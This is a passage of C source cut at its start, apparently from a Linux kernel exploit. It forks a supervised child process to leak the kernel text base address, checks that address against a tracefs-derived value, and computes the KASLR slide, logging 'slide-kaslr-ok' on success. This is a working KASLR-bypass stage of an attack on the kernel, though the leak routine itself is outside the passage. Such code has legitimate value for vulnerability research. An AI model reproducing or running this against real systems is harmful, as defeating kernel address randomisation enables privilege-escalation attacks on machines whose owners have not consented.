    }
    if (child == 0) {
      close(fds[0]);
      if (setpgid(0, 0) != 0) {
        _exit(120);
      }
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      struct slide_supervisor_result child_result = {
        .code = stext ? 0u : 1u,
        .value = stext,
      };
      int wrote = slide_supervisor_write_result(fds[1], &child_result);
      close(fds[1]);
      _exit(wrote == 0 ? (stext ? 0 : 1) : 121);
    }

    close(fds[1]);
    if (setpgid(child, child) != 0 && errno != EACCES && errno != ESRCH) {
      int saved_errno = errno;
      kill(child, SIGKILL);
      while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
      }
      close(fds[0]);
      errno = saved_errno;
      pr_warning("slide supervisor setpgid failed errno=%d\n", errno);
      return 0;
    }

    struct timespec deadline;
    if (slide_supervisor_deadline_after_ms(
            &deadline, SLIDE_SUPERVISOR_TIMEOUT_MS) != 0) {
      int saved_errno = errno;
      kill(-child, SIGKILL);
      kill(child, SIGKILL);
      while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
      }
      close(fds[0]);
      errno = saved_errno;
      pr_warning("slide supervisor deadline failed errno=%d\n", errno);
      return 0;
    }

    struct slide_supervisor_result result;
    int status = -1;
    enum slide_supervisor_outcome outcome = slide_supervisor_collect(
        child, fds[0], &deadline, &result, &status);
    int supervisor_errno = errno;
    if (outcome != SLIDE_SUPERVISOR_OK || result.code != 0 ||
        result.value == 0) {
      pr_warning("slide attempt %d supervisor=%s errno=%d code=%u "
                 "value=%016llx status=%d; refusing retry\n",
                 attempt, slide_supervisor_outcome_name(outcome),
                 supervisor_errno, result.code,
                 (unsigned long long)result.value, status);
      return 0;
    }
    uint64_t stext = result.value;

    if (p0_slide_leak == 2 && tracefs_base &&
        stext != tracefs_base) {
      pr_warning("slide attempt %d boot_id/wchan mismatch stext=%016llx "
                 "tracefs=%016llx\n",
                 attempt, (unsigned long long)stext,
                 (unsigned long long)tracefs_base);
      return 0;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
